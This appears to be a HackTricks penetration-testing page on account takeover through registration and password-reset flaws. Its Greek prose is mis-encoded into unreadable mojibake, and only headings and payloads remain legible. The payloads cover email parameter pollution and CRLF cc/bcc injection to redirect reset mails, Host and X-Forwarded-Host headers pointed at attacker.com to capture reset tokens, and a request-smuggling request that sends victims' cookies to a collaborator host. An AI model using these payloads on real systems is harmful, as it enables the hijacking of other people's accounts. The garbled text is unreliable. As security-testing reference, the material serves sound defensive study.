# Registration & Takeover Vulnerabilities

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Registration Takeover

### Duplicate Registration

* Î ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÏ„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Ï…Ï€Î¬ÏÏ‡Î¿Î½ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·
* Î•Î»Î­Î³Î¾Ï„Îµ Ï€Î¿Î¹ÎºÎ¹Î»Î¯Î± ÏƒÏ„Î¿ email:
* ÎºÎµÏ†Î±Î»Î±Î¯Î±
* \+1@
* Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î¿ Ï„ÎµÎ»ÎµÎ¯Î± ÏƒÏ„Î¿ email
* ÎµÎ¹Î´Î¹ÎºÎ¿ÏÏ‚ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ ÏƒÏ„Î¿ ÏŒÎ½Î¿Î¼Î± email (%00, %09, %20)
* Î’Î¬Î»Ï„Îµ Î¼Î±ÏÏÎ¿Ï…Ï‚ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ Î¼ÎµÏ„Î¬ Ï„Î¿ email: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### Username Enumeration

Î•Î»Î­Î³Î¾Ï„Îµ Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ±Ï„Î±Î»Î¬Î²ÎµÏ„Îµ Ï€ÏŒÏ„Îµ Î­Î½Î± ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· Î­Ï‡ÎµÎ¹ Î®Î´Î· ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Î¸ÎµÎ¯ Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®.

### Password Policy

Î”Î·Î¼Î¹Î¿Ï…ÏÎ³ÏÎ½Ï„Î±Ï‚ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÏ‰Î´Î¹ÎºÏÎ½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ (ÎµÎ»Î­Î³Î¾Ï„Îµ Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Î´ÏÎ½Î±Î¼Î¿Ï…Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚).\
Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ bruteforce Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î±.

### SQL Injection

[**Check this page** ](sql-injection/#insert-statement)Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÏÏ‚ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î±Î½Î±Î»Î¬Î²ÎµÏ„Îµ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Î® Î½Î± ÎµÎ¾Î¬Î³ÎµÏ„Îµ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î¼Î­ÏƒÏ‰ **SQL Injections** ÏƒÎµ Ï†ÏŒÏÎ¼ÎµÏ‚ ÎºÎ±Ï„Î±Ï‡ÏÏÎ·ÏƒÎ·Ï‚.

### Oauth Takeovers

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAML Vulnerabilities

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Change Email

ÎŒÏ„Î±Î½ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Î¸ÎµÎ¯Ï„Îµ Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÏ„Îµ Î½Î± Î±Î»Î»Î¬Î¾ÎµÏ„Îµ Ï„Î¿ email ÎºÎ±Î¹ ÎµÎ»Î­Î³Î¾Ï„Îµ Î±Î½ Î±Ï…Ï„Î® Î· Î±Î»Î»Î±Î³Î® ÎµÏ€Î¹ÎºÏ…ÏÏÎ½ÎµÏ„Î±Î¹ ÏƒÏ‰ÏƒÏ„Î¬ Î® Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î·Î½ Î±Î»Î»Î¬Î¾ÎµÏ„Îµ ÏƒÎµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î± emails.

### More Checks

* Î•Î»Î­Î³Î¾Ï„Îµ Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ **disposable emails**
* **ÎœÎ±ÎºÏÏÏ‚** **ÎºÏ‰Î´Î¹ÎºÏŒÏ‚** (>200) Î¿Î´Î·Î³ÎµÎ¯ ÏƒÎµ **DoS**
* **Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± ÏŒÏÎ¹Î± ÏÏ…Î¸Î¼Î¿Ï ÏƒÏ„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏÎ½**
* Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ username@**burp\_collab**.net ÎºÎ±Î¹ Î±Î½Î±Î»ÏÏƒÏ„Îµ Ï„Î¿ **callback**

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Î–Î·Ï„Î®ÏƒÏ„Îµ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· email ÏƒÎ±Ï‚
2. ÎšÎ¬Î½Ï„Îµ ÎºÎ»Î¹Îº ÏƒÏ„Î¿Î½ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚
3. ÎœÎ·Î½ Î±Î»Î»Î¬Î¾ÎµÏ„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ
4. ÎšÎ¬Î½Ï„Îµ ÎºÎ»Î¹Îº ÏƒÎµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ 3Î· Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î± (Ï€.Ï‡.: Facebook, twitter)
5. Î Î±ÏÎµÎ¼Î²Î¬Î»ÎµÏ„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± ÏƒÏ„Î¿ Burp Suite proxy
6. Î•Î»Î­Î³Î¾Ï„Îµ Î±Î½ Î· ÎºÎµÏ†Î±Î»Î¯Î´Î± referer Î´Î¹Î±ÏÏÎ­ÎµÎ¹ Ï„Î¿ token ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Î Î±ÏÎµÎ¼Î²Î¬Î»ÎµÏ„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿ Burp Suite
2. Î ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ Î® ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ ÏƒÏ„Î¿ Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Î ÏÎ¿Ï‰Î¸Î®ÏƒÏ„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± Î¼Îµ Ï„Î·Î½ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÎºÎµÏ†Î±Î»Î¯Î´Î±\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Î‘Î½Î±Î¶Î·Ï„Î®ÏƒÏ„Îµ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î·Î½ _ÎºÎµÏ†Î±Î»Î¯Î´Î± host_ ÏŒÏ€Ï‰Ï‚ : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ Î¼Îµ Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï„Î¿Ï… ÎºÎ±Î¹ Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯ ÏƒÏ„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± **Î‘Î»Î»Î±Î³Î® ÎºÏ‰Î´Î¹ÎºÎ¿Ï**.
2. ÎÎµÎºÎ¹Î½Î®ÏƒÏ„Îµ Ï„Î¿ Burp Suite ÎºÎ±Î¹ Ï€Î±Î³ÏÏƒÏ„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î±.
3. Î£Ï„ÎµÎ¯Î»Ï„Îµ Ï„Î¿ ÏƒÏ„Î·Î½ ÎºÎ±ÏÏ„Î­Î»Î± ÎµÏ€Î±Î½Î±Î»Î®Ï€Ï„Î· ÎºÎ±Î¹ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚: User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Î¤Î¿ token ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Ï„Ï…Ï‡Î±Î¯Î± ÎºÎ±Î¹ Î½Î± ÎµÎ¯Î½Î±Î¹ Î¼Î¿Î½Î±Î´Î¹ÎºÏŒ ÎºÎ¬Î¸Îµ Ï†Î¿ÏÎ¬.\
Î”Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ Î½Î± Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Î±Î½ Ï„Î¿ token Î»Î®Î³ÎµÎ¹ Î® Î±Î½ ÎµÎ¯Î½Î±Î¹ Ï€Î¬Î½Ï„Î± Ï„Î¿ Î¯Î´Î¹Î¿, ÏƒÎµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ Î¿ Î±Î»Î³ÏŒÏÎ¹Î¸Î¼Î¿Ï‚ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±Ï‚ ÎµÎ¯Î½Î±Î¹ Î±Î´ÏÎ½Î±Î¼Î¿Ï‚ ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î±Î½Ï„ÎµÏ…Ï„ÎµÎ¯. ÎŸÎ¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î¿Î½ Î±Î»Î³ÏŒÏÎ¹Î¸Î¼Î¿.

* Î§ÏÎ¿Î½Î¹ÎºÎ® ÏƒÎ®Î¼Î±Î½ÏƒÎ·
* UserID
* Email Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·
* ÎŒÎ½Î¿Î¼Î± ÎºÎ±Î¹ Î•Ï€ÏÎ½Ï…Î¼Î¿
* Î—Î¼ÎµÏÎ¿Î¼Î·Î½Î¯Î± Î“Î­Î½Î½Î·ÏƒÎ·Ï‚
* ÎšÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î¯Î±
* ÎœÏŒÎ½Î¿ Î±ÏÎ¹Î¸Î¼Î¿Î¯
* ÎœÎ¹ÎºÏÎ® Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¯Î± token (Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚ Î¼ÎµÏ„Î±Î¾Ï \[A-Z,a-z,0-9])
* Î•Ï€Î±Î½Î±Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¯Î·ÏƒÎ· token
* Î—Î¼ÎµÏÎ¿Î¼Î·Î½Î¯Î± Î»Î®Î¾Î·Ï‚ token

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Î ÏÎ¿ÎºÎ±Î»Î­ÏƒÏ„Îµ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ API/UI Î³Î¹Î± Î¼Î¹Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· email Ï€.Ï‡: test@mail.com
2. Î•Î¾ÎµÏ„Î¬ÏƒÏ„Îµ Ï„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÎºÎ±Î¹ ÎµÎ»Î­Î³Î¾Ï„Îµ Î³Î¹Î± `resetToken`
3. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ token ÏƒÎµ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· URL ÏŒÏ€Ï‰Ï‚ `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î¼Îµ Î­Î½Î± ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· Ï„Î±Ï…Ï„ÏŒÏƒÎ·Î¼Î¿ Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚, Î±Î»Î»Î¬ Î¼Îµ ÎºÎµÎ½Î¬ Î´Î¹Î±ÏƒÏ„Î®Î¼Î±Ï„Î± Ï€ÏÎ¹Î½ ÎºÎ±Î¹/Î® Î¼ÎµÏ„Î¬ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·. Ï€.Ï‡: `"admin "`
2. Î–Î·Ï„Î®ÏƒÏ„Îµ Î¼Î¹Î± ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Î¼Îµ Ï„Î¿ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· ÏƒÎ±Ï‚.
3. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ token Ï€Î¿Ï… ÏƒÏ„Î¬Î»Î¸Î·ÎºÎµ ÏƒÏ„Î¿ email ÏƒÎ±Ï‚ ÎºÎ±Î¹ ÎµÏ€Î±Î½Î±Ï†Î­ÏÎµÏ„Îµ Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚.
4. Î£Ï…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚ Î¼Îµ Ï„Î¿Î½ Î½Î­Î¿ ÎºÏ‰Î´Î¹ÎºÏŒ.

Î— Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î± CTFd Î®Ï„Î±Î½ ÎµÏ…Î¬Î»Ï‰Ï„Î· ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ·.\
Î”ÎµÎ¯Ï„Îµ: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Î’ÏÎµÎ¯Ï„Îµ Î­Î½Î± XSS Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î® ÏƒÎµ Î¼Î¹Î± Ï…Ï€Î¿Ï„Î¿Î¼Î­Î± Î±Î½ Ï„Î± cookies ÎµÎ¯Î½Î±Î¹ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± ÏƒÏ„Î¿Î½ Î³Î¿Î½Î¹ÎºÏŒ Ï„Î¿Î¼Î­Î±: `*.domain.com`
2. Î”Î¹Î±ÏÏÎµÏÏƒÏ„Îµ Ï„Î¿ Ï„ÏÎ­Ï‡Î¿Î½ **cookie ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±Ï‚**
3. Î‘Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯Ï„Îµ Ï‰Ï‚ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ **smuggler** Î³Î¹Î± Î½Î± Î±Î½Î¹Ï‡Î½ÎµÏÏƒÎµÏ„Îµ Ï„Î¿Î½ Ï„ÏÏ€Î¿ HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Ï€Î¿Ï… Î¸Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÎ¹ Ï„Î¿ `POST / HTTP/1.1` Î¼Îµ Ï„Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î´ÎµÎ´Î¿Î¼Î­Î½Î±:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` Î¼Îµ ÏƒÏ„ÏŒÏ‡Î¿ Î½Î± Î±Î½Î¿Î¯Î¾ÎµÏ„Îµ Î±Î½Î±ÎºÎ±Ï„ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Ï‰Î½ Î¸Ï…Î¼Î¬Ï„Ï‰Î½ ÏƒÏ„Î¿ burpcollab ÎºÎ±Î¹ Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ Ï„Î± cookies Ï„Î¿Ï…Ï‚\
3\. Î¤Î¿ Ï„ÎµÎ»Î¹ÎºÏŒ Î±Î¯Ï„Î·Î¼Î± Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î¼Î¿Î¹Î¬Î¶ÎµÎ¹ Î¼Îµ Ï„Î¿ ÎµÎ¾Î®Ï‚
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone reports exploiting this bug\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î± payload Î³Î¹Î± Ï„Î¿ CSRF, Ï€.Ï‡: â€œHTML Ï†ÏŒÏÎ¼Î± Î¼Îµ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î· Ï…Ï€Î¿Î²Î¿Î»Î® Î³Î¹Î± Î±Î»Î»Î±Î³Î® ÎºÏ‰Î´Î¹ÎºÎ¿Ïâ€
2. Î£Ï„ÎµÎ¯Î»Ï„Îµ Ï„Î¿ payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

Î¤Î¿ JSON Web Token Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· ÎµÎ½ÏŒÏ‚ Ï‡ÏÎ®ÏƒÏ„Î·.

* Î•Ï€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¿ JWT Î¼Îµ Î¬Î»Î»Î¿ User ID / Email
* Î•Î»Î­Î³Î¾Ï„Îµ Î³Î¹Î± Î±Î´ÏÎ½Î±Î¼Î· Ï…Ï€Î¿Î³ÏÎ±Ï†Î® JWT

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## References

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
